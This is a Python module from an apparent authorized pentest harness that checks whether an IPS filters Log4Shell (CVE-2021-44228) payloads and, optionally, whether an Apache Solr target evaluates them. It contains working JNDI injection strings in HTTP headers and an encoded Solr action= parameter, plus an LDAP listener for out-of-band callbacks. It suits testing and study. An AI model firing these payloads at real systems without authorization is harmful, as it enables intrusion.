"""CVE-2021-44228 — Log4Shell.

Two things, cleanly separated — because they answer DIFFERENT questions and the
difference is easy to over-read:

  DEFAULT (no infra, always runs) — a BOUNDARY / IPS-signature test. Sends a
  benign JNDI marker string in the User-Agent + X-Api-Version header so the
  SD-WAN IPS's JNDI signature is actually exercised (not just a reachability
  ping). The verdict here answers: did the payload-bearing request REACH the app
  (the IPS did NOT filter the `${jndi:` pattern)? SUCCESS = passed the boundary
  undetected. ⚠ This does NOT mean the target is exploitable — any web server
  that returns 2xx/3xx scores SUCCESS, vulnerable or patched. It validates the
  CONTROL, not the target.

  --active (opt-in, out-of-band) — the ACTUAL exploitation test. Stands up a
  throwaway LDAP catcher, fires the payload via the vector that really reaches
  log4j on Solr — the URL-ENCODED `action=` param on /solr/admin/cores (raw
  braces in the query get eaten by Jetty/Solr's param handling; the headers are
  kept too, for the IPS signature) — and waits for the TARGET to connect back.
  A callback PROVES log4j evaluated `${jndi:...}` and reached out (real
  exploitation, scored RCE-CONFIRMED). The catcher serves NOTHING executable
  (an empty LDAP bind reply only), so no code runs on the target — it only
  proves the lookup fired. Always torn down. Needs the target to be able to
  reach us: same segment / routable, or set `attacker_vps` (config.json) to a
  redirector that forwards to this host, or `--source` to pick the egress IP.

Three default probes, in order:
  1. baseline  — plain request, no JNDI payload. Timing reference only; uses a
     BASELINE_CODE: label (not HTTP_CODE:) so success/blocked regex can't match it.
  2. signature — JNDI points at 127.0.0.1:1389 on the *target itself*, where
     nothing listens, so there is NO callback and NO code execution even if
     vulnerable. Drives the boundary verdict (did the request reach the app?).
  3. timing    — JNDI points at 192.0.2.1 (RFC5737 TEST-NET-1, unroutable). If
     log4j attempts the lookup *synchronously*, the request hangs vs baseline — a
     best-effort signal, NO infra needed. NOT proof either way: many deployments
     log asynchronously and show no delay even when genuinely vulnerable (this
     lab's Solr does exactly that), so no-delay does NOT mean not vulnerable.

Verdict: RCE-CONFIRMED (out-of-band callback, --active) is the strongest
SUCCESS — real exploitation proven. Otherwise a payload-bearing request served
(HTTP_CODE:2xx/3xx) -> it reached the app, the IPS did NOT filter the pattern
(boundary finding). curl's exit/timeout code (HTTP_CODE:000) or a 403 -> something
between us and the app refused/dropped it -> control held.
"""
import os
import re
import random
import socket
import string
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

META = {
    "id": "log4shell",
    "name": "Log4Shell (CVE-2021-44228)",
    "category": "Server Exploitation",
    "order": 2,  # mid-batch, right after apache_41773 and right before
                 # DNS-over-HTTPS Bypass (see loader.py's sort key)
    "test_type": "pentest",
    "control": "IPS signature (JNDI pattern) + log4j patch / formatMsgNoLookups",
    "fix": "SD-WAN",
    "cve": "CVE-2021-44228",
    "mitre": ['T1190'],
    "cwe": ['CWE-917'],
    "tactic": 'Initial Access',
    "requires": ["curl"],   # the default signature/timing probes use curl; --active OOB is pure stdlib
    "active": True,         # advertises the --active out-of-band exploitation-confirmation capability
    # an inline IPS/WAF (Sangfor NGAF / Forcepoint) matches this payload and often
    # BLACKLISTS the source for a window — run it after the quiet modules so the
    # ban it may trip can't turn their verdicts into false BLOCKEDs.
    "trips_ips": True,
    "ports": [("tcp", 8080)],
    "port_customizable": True,
    # RCE-CONFIRMED (real OOB exploitation, --active) is the strongest success;
    # otherwise a payload request that was served (2xx/3xx) = passed the boundary.
    "success_regex": r"RCE-CONFIRMED|HTTP_CODE:[23]\d\d",
    "blocked_regex": r"timed out|Connection refused|HTTP_CODE:000|HTTP_CODE:403",
}

# Endpoints that reach the vulnerable logging call: '/' for generic Spring-style
# apps (e.g. the lab's log4shell-vulnerable-app reads X-Api-Version there) and
# '/solr/' for a real Apache Solr. Probe each; the first that serves (2xx/3xx) is
# where the payload landed.
_PATHS = ["/", "/solr/"]
# doubled braces: this string also goes through ctx.run_cmd's .format(), same
# as curl's own -w spec below — single braces here would make .format() treat
# "jndi:ldap://..." as a (nonexistent) format field and raise KeyError('jndi').
_JNDI_LOCAL = "${{jndi:ldap://127.0.0.1:1389/log4shell-probe}}"       # always-safe: target's own loopback, nothing listens
_JNDI_BLACKHOLE = "${{jndi:ldap://192.0.2.1:1389/log4shell-timing}}"  # RFC5737 TEST-NET-1: reserved, never a real host

# curl's own -w format spec. Doubled braces survive ctx.run_cmd's .format()
# call (which collapses {{ }} -> { } before handing the command to the
# shell), giving curl the literal %{http_code}/%{time_total} it needs.
_W_SIGNAL = 'HTTP_CODE:%{{http_code}} TIME:%{{time_total}}'
_W_BASELINE = 'BASELINE_CODE:%{{http_code}} TIME:%{{time_total}}'

# --active out-of-band confirmation: the LDAP catcher port (the host:port the
# JNDI payload points at) and how long to wait for the target to connect back.
# Both overridable via env; module globals so tests can shrink the wait.
_OOB_PORT = int(os.environ.get("HARNESS_L4S_OOB_PORT", "1389"))
_OOB_WAIT = float(os.environ.get("HARNESS_L4S_OOB_WAIT", "8"))
# A minimal LDAP BindResponse(resultCode=success) so the JNDI client proceeds to
# its SearchRequest, which carries the /<marker> path as the base DN — that is
# how we attribute a callback to THIS run (vs an unrelated connection).
_LDAP_BIND_OK = b"\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00"


def _probe(ctx, target, url, ua_value, timeout, w_fmt):
    cmd = 'curl -s -m%d -L -o %s -A "%s" -H "X-Api-Version: %s" -w "%s" "%s"' % (
        timeout, os.devnull, ua_value, ua_value, w_fmt, url)
    return ctx.run_cmd(cmd, target)


def _extract_time(raw):
    m = re.search(r"TIME:([\d.]+)", raw)
    return float(m.group(1)) if m else None


def _callback_host(ctx, target):
    """The address the TARGET can reach US at for the OOB callback: an explicit
    operator redirector (attacker_vps) > the --source egress IP > the local IP on
    the route to the target (autodetected). None only if all three fail."""
    h = ctx.cfg("attacker_vps") or getattr(ctx, "source_ip", None)
    if h:
        return h
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target, 9))          # no packet sent for UDP connect; just picks the route
            return s.getsockname()[0]
        finally:
            s.close()
    except OSError:
        return None


def _await_callback(bind_port, marker, result, stop):
    """Listen for the target's JNDI/LDAP connect and set result['hit'] when a
    connection carrying `marker` arrives. Replies to the LDAP bind so the client
    reveals the /<marker> path in its search. Non-destructive: serves nothing
    executable. Sets result['bound'] once listening, result['error'] if it can't.
    Always closes the socket."""
    srv = None
    try:
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", bind_port))
        srv.listen(8)
        srv.settimeout(0.5)
        result["bound"] = True
    except OSError as e:
        result["error"] = "cannot bind :%d (%s)" % (bind_port, e.__class__.__name__)
        stop.set()
        if srv is not None:
            srv.close()
        return
    mk = marker.encode()
    while not stop.is_set():
        try:
            c, a = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        try:
            c.settimeout(2)
            data = c.recv(512)
            try:
                c.sendall(_LDAP_BIND_OK)    # elicit the search request (carries the marker)
                data += c.recv(512)
            except OSError:
                pass
            if mk in data:
                result["hit"] = a[0]
                result["raw"] = data
                stop.set()
        except OSError:
            pass
        finally:
            try:
                c.close()
            except OSError:
                pass
    srv.close()


def _fire_oob(target, web_port, host, oob_port, marker, ctx):
    """Fire the ENCODED action= JNDI payload (the vector that actually reaches
    log4j on Solr) plus the UA/X-Api-Version headers, at the target. Returns a
    short evidence line. Best-effort: a 400 is the expected app response — we
    only care whether the callback lands, not the HTTP status."""
    payload = "${jndi:ldap://%s:%d/%s}" % (host, oob_port, marker)
    qs = urllib.parse.urlencode({"action": payload})   # -> action=%24%7Bjndi%3A...%7D
    url = "http://%s:%d/solr/admin/cores?%s" % (target, web_port, qs)
    headers = {"User-Agent": payload, "X-Api-Version": payload}
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers=headers), timeout=6) as resp:
            code = resp.getcode()
    except urllib.error.HTTPError as e:
        code = e.code
    except Exception as e:
        code = "err(%s)" % type(e).__name__
    return "fired encoded action= + UA/X-Api-Version JNDI at /solr/admin/cores (HTTP %s)" % code


def _oob_confirm(target, web_port, ctx):
    """Active (--active) out-of-band EXPLOITATION check. Returns (lines, confirmed).
    Stands up a throwaway LDAP catcher, fires the encoded JNDI payload, and waits
    for the target to connect back — proving log4j performed the lookup. Always
    tears the listener down."""
    out = ["## [ACTIVE] out-of-band exploitation confirmation (encoded action= vector)"]
    host = _callback_host(ctx, target)
    if not host:
        out.append("[SKIP] could not determine a callback address the target can reach — set "
                   "attacker_vps (config.json / HARNESS_CFG_ATTACKER_VPS) or --source.")
        return out, False

    marker = "l4s" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    result, stop = {}, threading.Event()
    th = threading.Thread(target=_await_callback, args=(_OOB_PORT, marker, result, stop), daemon=True)
    th.start()
    # wait for the listener to actually bind (or fail) before firing — no fixed sleep race
    for _ in range(40):
        if result.get("bound") or result.get("error"):
            break
        time.sleep(0.05)
    if result.get("error"):
        stop.set()
        out.append("[SKIP] OOB listener could not start: %s — port in use or needs privilege; "
                   "set HARNESS_L4S_OOB_PORT to a free high port." % result["error"])
        return out, False

    out.append("[*] LDAP catcher on 0.0.0.0:%d · callback host %s · marker %s" % (_OOB_PORT, host, marker))
    out.append("[*] " + _fire_oob(target, web_port, host, _OOB_PORT, marker, ctx))

    deadline = time.time() + _OOB_WAIT
    while time.time() < deadline and not stop.is_set():
        time.sleep(0.25)
    confirmed = "hit" in result
    stop.set()
    th.join(timeout=2)

    if confirmed:
        out.append("RCE-CONFIRMED: out-of-band JNDI/LDAP callback from %s (marker %s) — the target "
                   "EVALUATED ${jndi:...} and connected back to our listener. Actual Log4Shell "
                   "exploitation PROVEN, not just a signature that passed the boundary. (The catcher "
                   "served nothing executable, so no code ran on the target — only the lookup fired. "
                   "Fix: patch log4j to 2.17.1+ / remove JndiLookup.)" % (result["hit"], marker))
    else:
        out.append("[OOB-INCONCLUSIVE] no callback within %.0fs — the target did not reach our "
                   "listener. This does NOT clear it: the lookup may be async, egress to our port may "
                   "be filtered, or our callback host (%s:%d) isn't reachable from the target. The "
                   "boundary/signature result above still stands." % (_OOB_WAIT, host, _OOB_PORT))
    return out, confirmed


def run(target, ctx):
    port = ctx.get_port("log4shell", 8080)
    out = ["# Log4Shell probe vs %s:%d" % (target, port), ""]

    # find the endpoint that serves (payload reaches the app); signature probe each.
    # Every probe's HTTP_CODE line is recorded in `out`, which is what the
    # classifier reads — so the served-vs-blocked verdict stands whether or not a
    # path served, with no extra request needed.
    url = None
    for path in _PATHS:
        u = "http://%s:%d%s" % (target, port, path)
        r = _probe(ctx, target, u, _JNDI_LOCAL, 10, _W_SIGNAL)
        out += ["## signature probe (JNDI in UA + X-Api-Version) -> %s" % path, r, ""]
        if re.search(r"HTTP_CODE:[23]\d\d", r):
            url = u
            break
    if url is None:                       # none served 2xx/3xx -> use first path for the timing legs
        url = "http://%s:%d%s" % (target, port, _PATHS[0])

    baseline_raw = _probe(ctx, target, url, "harness-baseline-probe", 8, _W_BASELINE)
    timing_raw = _probe(ctx, target, url, _JNDI_BLACKHOLE, 15, _W_SIGNAL)

    out += [
        "## baseline (no JNDI payload, timing reference) on %s" % url, baseline_raw, "",
        "## timing probe (JNDI -> 192.0.2.1 unroutable — blind-detection) on %s" % url,
        timing_raw,
    ]

    base_t, timing_t = _extract_time(baseline_raw), _extract_time(timing_raw)
    if base_t is not None and timing_t is not None:
        delta = timing_t - base_t
        out.append("")
        if delta > 3.0:
            out.append(
                "[TIMING-SIGNAL] payload request took %.1fs longer than baseline (%.1fs vs %.1fs) — "
                "consistent with the backend attempting the JNDI connection. Best-effort only: a "
                "delay is a decent positive signal, NOT proof of RCE; many real deployments log "
                "asynchronously and would show no delay even when genuinely vulnerable." % (
                    delta, timing_t, base_t))
        else:
            out.append(
                "[TIMING] no significant delay (%.3fs vs %.3fs baseline) — inconclusive either way "
                "(async logging would also show this even on a vulnerable target)." % (timing_t, base_t))

    # ---- active out-of-band EXPLOITATION confirmation (opt-in) ----------------
    out.append("")
    if ctx.allow_active:
        oob_lines, _confirmed = _oob_confirm(target, port, ctx)
        out += oob_lines
    else:
        out.append("[*] OOB exploitation confirmation OFF (default): this run only tested whether the "
                   "boundary/IPS filters the JNDI signature — a SUCCESS above means the payload-bearing "
                   "request PASSED the boundary undetected, NOT that the target actually evaluates "
                   "${jndi:...}. Re-run with --active to stand up a listener and confirm real "
                   "exploitation (the target must be able to reach you: same segment / routable, or set "
                   "attacker_vps to your redirector).")
    return "\n".join(out)
